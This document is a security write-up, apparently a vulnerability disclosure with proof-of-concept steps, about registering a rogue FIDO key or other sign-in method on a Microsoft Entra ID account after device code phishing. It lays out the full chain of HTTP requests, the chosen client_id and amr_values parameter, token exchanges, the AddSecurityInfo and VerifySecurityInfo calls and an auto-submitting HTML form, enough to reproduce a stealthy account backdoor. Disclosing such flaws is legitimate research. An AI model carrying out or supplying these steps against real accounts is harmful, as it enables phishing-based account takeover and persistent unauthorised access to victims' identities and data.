# Summary

An attacker is able to register new Security Keys (FIDO) or other Sign-In methods (Authenticator, Email, Phone etc.) after a successful device code phishing attack.

This allows attackers to fully take over the victims account.
1. In case of a new Security Key the victims password will be unchanged. Allowing for backdooring the account in a stealthy way.
2. In case of additional registered Sign-In methods like Email, Phone etc. those could be abused during Self-Service Password Reset. The victims password will be changed. 

# Prerequisites

## Prerequisites for PoC Code
1. Install Google-Chrome
2. pip install browsermob-proxy
3. pip install webdriver-manager
4. Download & extract BrowserMob Proxy binary from http://bmp.lightbody.net/ (https://github.com/lightbody/browsermob-proxy/releases/download/browsermob-proxy-2.1.4/browsermob-proxy-2.1.4-bin.zip)
5. In the python script change following variables
	1. `bmp` set it to the browsermob-proxy binary you downloaded and extracted in step 4
	2. `postHtmlFile` this is the HTML file which is opened via Selenium. Specify a path on your system. The script needs just a writable path so the file does not have to exist.

Also following libs are imported which probably should be available already in the python environment:
```
import requests
import json
import time
import re
```
The PoC Code has no kind of error handling.

## Prerequisites Azure AD
1. Security Keys must be allowed for authentication.
	1. For virtual FIDO keys you must set `Enforce attestation` to "No".
	2. The PoC works also with the `Enforce attestation` on "Yes" and a real FIDO key
	3. `Allow self-service` must also be allowed

# PoC Code Steps Explained
1. Start the script. A user code will be shown. Copy it and perform a device code login flow for your victim.
2. The PoC polls in the background if the flow was successful. If so it will perform all steps until step 6 of the overview chapter.
3. The PoC code will open Chrome and display a "Submit" button. You can add a virtual FIDO key or plugin a "real" one.
4. Hit "Submit" and follow the registration instructions.
5. After adding the FIDO key the browser will perform some redirects (steps 8.1 and 8.2 of the overview chapter). Since it has no Access Tokens it cannot perform the last step. A sign-in page will be shown.
6. Return to the script and press Enter. After that the script will take a while to search all response bodies captured. If it finds the necessary parameters it will perform the last step for you.
7. If "ErrorCode 0" is shown then the registration process was successful. 
8. Login with the newly registered FIDO key.

# Overview 
1. Attacker initializes the device code flow on `login.microsoftonline.com` with `amr_values=ngcmfa` on the v1 oauth2 endpoint. The resulting user code is sent to the victim. The victim performs the login with 2FA authentication if needed.
2. Attacker completes the device code flow on `login.microsoftonline.com` on the corresponding v1 oauth2 endpoint.
3. The resulting refresh token is used on the v2 oauth2 endpoint of `login.microsoftonline.com` to exchange it for a token which is accepted by `account.activedirectory.windowsazure.com`.
4. On `account.activedirectory.windowsazure.com` a sessionCtx token must be requested.
5. On `account.activedirectory.windowsazure.com` the `/securityinfo/AddSecurityInfo` backend is called to add a new FIDO key. The API returns provision data to register the new FIDO key.
6. The provision data is sent to `login.microsoft.com/{tenant-id}/fido/create`
7. The FIDO key is added and attestation data is returned.
8. Two consecutive post requests are performed (automatically done if a browser is used)
	1. `account.activedirectory.windowsazure.com/securityInfo/newfido` (does not require additional authentication, the canary value acts as one)
	2. `api.mysignins.microsoft.com/api/post/fidopost` (require additional authentication.)
9. Final API call to complete the FIDO registration on `account.activedirectory.windowsazure.com/securityInfo/VerifySecurityInfo` (Data from step 8.2 are used for this request. Additionally a name can be specified for the device).
10. Done. Login should now be possible with the FIDO key. Bypassing any password/2fa requirements.

## Detailed Overview
I assume that you are familiar with device code phishing. Otherwise you will find plenty of blogs etc. about this topic on the Internet. Instead I show here the necessary steps and HTTP calls which have been described above in more detail.

### Step 1
This is the initial call for the device code flow. Note that it is requested on the v1 oauth2 endpoint since amr_values is not supported on the v2 endpoint or I just didn't figure out the correct parameter name.

Request
```
POST https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0 HTTP/1.1
Host: login.microsoftonline.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 110

client_id=00b41c95-dab0-4487-9791-b9d2c32c80f2&resource=0000000c-0000-0000-c000-000000000000&amr_values=ngcmfa
```

Response
```
HTTP/1.1 200 OK
[cut]

{
    "device_code": "GAQABAAEAAAAtyolDObpQQ5VtlI4uGjEPIj3qY9zcBvFuPgAiFKDJWynYmhiR0TGRrDKJHrKypH12FfCPNP3HOubLhV0Z1AsXdFLhyKAhCy0uTif6oO1fRK1Ld_ctMIUE4kYhGlHeaYsmaBxYdBTpQXhaa3H8sBE78RXskjBUPuted7kHNZ1bPfAp_smDRz-LFMg4Pjxlf8sgAA",
    "expires_in": "900",
    "interval": "5",
    "message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code GVNRPQQGE to authenticate.",
    "user_code": "GVNRPQQGE",
    "verification_url": "https://microsoft.com/devicelogin"
}
```

#### client_id
The used `client_id` is the one of `Office 365 Management`. This one is chosen because the resulting access tokens will have the FOCI1 claim. It is possible to use any other `client_id` as long it belongs to the FOC1 family.  See https://github.com/secureworks/family-of-client-ids-research/blob/main/known-foci-clients.csv for further `client_ids`. This simplifies also phishing since a `client_id` can be chosen which best matches the phishing story.

#### amr_values
`amr_values` is set to `ngcmfa`. This claim is required for adding new Security Keys. It is not required if other Sign-in methods (Email, Phone, authenticator) want to be added. The `ngcmfa` claim is also only available for ~15 mins.

#### resource/scope
Although the above call specifies `0000000c-0000-0000-c000-000000000000` (Microsoft App Access Panel) other resources could be requested like MS Graph.

### Step 2
Complete the device code flow. Parameters must be identical to the initial request.

Request
```
POST https://login.microsoftonline.com/common/oauth2/token?api-version=1.0 HTTP/1.1
Host: login.microsoftonline.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 361

resource=0000000c-0000-0000-c000-000000000000&grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=00b41c95-dab0-4487-9791-b9d2c32c80f2&code=GAQABAAEAAAAtyolDObpQQ5VtlI4uGjEPIj3qY9zcBvFuP2AiFKDJWynYmhiR0TGRrDKJHrKypH12FfCPNP3HOubLhV0Z1AsXdFLhyKAhCy0uTif6oO1fRK1Ld_ctMIUE4kYhGlHeaYsmaBxYdBTpQXhaa3H8sBE78RXskjBUPuted7kHNZ1bPfAp_smDRz-LFMg4Pjxlf8sgAA
```

Response returns the needed refresh token
```
HTTP/1.1 200 OK
[cut]

{"token_type":"Bearer","scope":"user_impersonation","expires_in":"599","ext_expires_in":"599","expires_on":"1694613416","not_before":"1694612516","resource":"spn:0000000c-0000-0000-c000-000000000000","access_token":"[cut]","refresh_token":"[cut]","foci":"1","id_token":"[cut]"}
```

### Step 3
The refresh token from step 2 is now exchanged for an access token on the v2 oauth2 endpoint.
```
POST https://login.microsoftonline.com/common/oauth2/v2.0/token HTTP/1.1
Host: login.microsoftonline.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 1048

client_id=00b41c95-dab0-4487-9791-b9d2c32c80f2&scope=0000000c-0000-0000-c000-000000000000/.default&refresh_token=[cut]&grant_type=refresh_token
```

Response
```
HTTP/1.1 200 OK
[cut]

{"token_type":"Bearer","scope":"0000000c-0000-0000-c000-000000000000/user_impersonation 0000000c-0000-0000-c000-000000000000/.default","expires_in":1199,"ext_expires_in":1199,"access_token":"[cut]","refresh_token":"[cut]","foci":"1"}
```

### Step 4
With the access token of step 3 it is now possible to get the `sessionCtx` token from `account.activedirectory.windowsazure.com`.

Request
```
POST /securityinfo/Authorize HTTP/1.1
Host: account.activedirectory.windowsazure.com
Content-Length: 0
Content-Type: application/json
Authorization: Bearer [cut]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Connection: close

```

Response
```
HTTP/1.1 200 OK
[cut]

)]}',
{
    "authContextTags": [],
    "isAuthorized": true,
    "isMyStarEnabled": true,
    "promptForLogin": false,
    "requireMfa": false,
    "requireNgcMfa": false,
    "requiresProofUpCodeParam": false,
    "sessionCtx": "[cut]"
}
```

### Step 5
Initial call to add a new FIDO key. Other Type IDs will start different flows to add for example an authenticator app.

Request
```
POST /securityinfo/AddSecurityInfo HTTP/1.1
Host: account.activedirectory.windowsazure.com
Content-Length: 11
Sessionctx: [cut]
Authorization: Bearer [cut]
Content-Type: application/json
Connection: close

{"Type":12}
```

Response contains cannary, serverChallenge and other stuff.
```
HTTP/1.1 200 OK
[cut]

)]}',
{
    "Data": "{\"provisionUrl\":\"https://login.microsoft.com/925c2cd8-a177-41a5-93f3-1257ffd75111/fido/create\",\"requestData\":{\"canary\":\"[cut]"]\",\"serverChallenge\":\"[cut]",\"userId\":\"T0Y62CxcknehpUGT8xJX_9dTNKREdZKBNCqeKxFe3H83dJVZUMU9nrlO6ULkw_j9je_Y\",\"userIconUrl\":null,\"memberName\":\"user@insecure.technology\",\"userDisplayName\":\"user\",\"postBackUrl\":\"https://account.activedirectory.windowsazure.com:443/securityInfo/newfido\",\"authenticator\":\"cross-platform\"}}",
    "ErrorCode": 0,
    "Type": 12,
    "VerificationContext": null,
    "VerificationState": 1
}
```

### Step 6-8
Since we want to add a new FIDO key we need a webauthn interface. The easiest solution is to perform this steps in a browser. To do this a HTML page is built from the step 7 returned parameter data. The page will perform the HTTP Post request with the required parameters.

Example HTML site
```
<html>
  <body>
    <form action="https://login.microsoft.com/925c2cd8-a177-41a5-93f3-1257ffd75111/fido/create" method="POST">
      <input type="hidden" name="canary" value="[cut]" />
      <input type="hidden" name="ExcludeNextGenCredentialsJSON" value="[]" />
      <input type="hidden" name="serverChallenge" value="[cut]" />
      <input type="hidden" name="userId" value="A0Y62CxcknehpUGT8xJX_9dTNKREdZKBNCqeKxFe3H83dJVZUMU9nrlO6ULkw_j9je_Y" />
      <input type="hidden" name="userIconUrl" value="None" />
      <input type="hidden" name="memberName" value="user@insecure.technology" />
      <input type="hidden" name="userDisplayName" value="user" />
      <input type="hidden" name="postBackUrl" value="https://account.activedirectory.windowsazure.com:443/securityInfo/newfido" />
      <input type="hidden" name="authenticator" value="cross-platform" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

The FIDO key can then be added in the browser. The browser will perform two additional post requests (Steps 8.1 and 8.2) after the key has been added. The final Post request requires authentication and can not be completed from the browser since the Access Token and the sessionCtx are not present.

### Step 9
Finalize the setup with the data received from Step 8.2. A name can be given to the device.

Request
```
POST /securityinfo/VerifySecurityInfo HTTP/1.1
Host: account.activedirectory.windowsazure.com
Content-Length: 12049
Sessionctx: [cut]
Authorization: Bearer [cut]
Content-Type: application/json
Connection: close
```

Response
```
{
    "Type": 12,
    "VerificationData": "{\"PostInfo\":\"\",\"Name\":\"AddedByDeviceCodePhishing\",\"AttestationObject\":\"[cut]\",\"Canary\":\"[cut]\",\"CredentialId\":\"jQYMNUgjf6eR5KBIkSMjarAl7cWppvwOCk_6nOedquhy9wX2g9yY6xs_ws1g5I6-\",\"ClientExtensionResults\":\"eyJobWFjQ3JlYXRlU2VjcmV0Ijp0cnVlfQ\"}"
}
```

### Step 10
Login with the new FIDO key.
